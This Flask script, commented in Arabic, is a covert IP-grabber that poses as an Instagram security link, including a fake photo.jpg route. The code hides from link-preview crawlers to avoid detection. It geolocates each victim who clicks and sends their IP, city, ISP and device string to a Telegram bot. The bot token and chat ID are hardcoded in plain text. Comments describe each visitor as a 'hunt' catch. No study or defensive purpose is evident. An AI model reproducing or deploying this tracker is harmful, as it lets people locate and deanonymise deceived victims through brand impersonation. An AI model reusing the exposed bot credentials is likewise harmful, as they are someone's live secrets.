from flask import Flask, request
import requests

app = Flask(__name__)

# --- الإعدادات الأصلية (لا تغيير) ---
TELEGRAM_TOKEN = "8459471902:AAHLHHiOWWAQSOzvn6TFWMWuZR0r9cf_CUo"
CHAT_ID = "8524242091" 

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
    try:
        # استخدام json=payload لضمان التوافق مع تليجرام
        requests.post(url, json=payload, timeout=5)
    except:
        pass

@app.route('/')
@app.route('/check-status')
@app.route('/photo.jpg') # الخطة ج: لزيادة احتمالية الصيد بدون ضغط
def track():
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    user_agent = request.headers.get('User-Agent', 'Unknown')
    ua_lower = user_agent.lower()

    # --- الخطة ب: فلترة البوتات (تجاوز الحماية) ---
    # إذا كان الزائر بوت (Amazon/Facebook/Vercel) نطرده فوراً لكي لا يعطل الكود
    if any(bot in ua_lower for bot in ['facebookexternalhit', 'vercel', 'amazon', 'headlesschrome']):
        return "Not Found", 404

    # الخطة أ: تدوير الروابط (جلب v من الرابط)
    v_param = request.args.get('v', '1')

    # جلب الموقع مع "حماية" لكي لا يتوقف الكود إذا فشل الموقع
    try:
        geo_res = requests.get(f'http://ip-api.com/json/{ip_address}', timeout=5).json()
        city = geo_res.get('city', 'Unknown')
        country = geo_res.get('country', 'Unknown')
        isp = geo_res.get('isp', 'Unknown')
    except:
        # إذا تعطل موقع الأي بي، نضع بيانات وهمية لكي يستمر الكود ويرسل الرسالة
        city = country = isp = "Blocked/Error"

    report = (
        f"🎯 <b>تنبيه صيد جديد (v={v_param})!</b>\n"
        f"--------------------------\n"
        f"🌐 <b>IP:</b> <code>{ip_address}</code>\n"
        f"📍 <b>الموقع:</b> {city}, {country}\n"
        f"🏢 <b>المزود:</b> {isp}\n"
        f"📱 <b>الجهاز:</b> {user_agent}\n"
        f"--------------------------"
    )
    
    # إرسال الرسالة باستخدام دالتك الأصلية
    send_to_telegram(report)
    
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <meta property="og:title" content="Instagram Security">
        <meta property="og:image" content="https://www.instagram.com/static/images/ico/favicon-192.png/b306391458a7.png">
        <meta property="og:type" content="video.other">
    </head>
    <body><h1>404 Not Found</h1></body>
    </html>
    """, 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
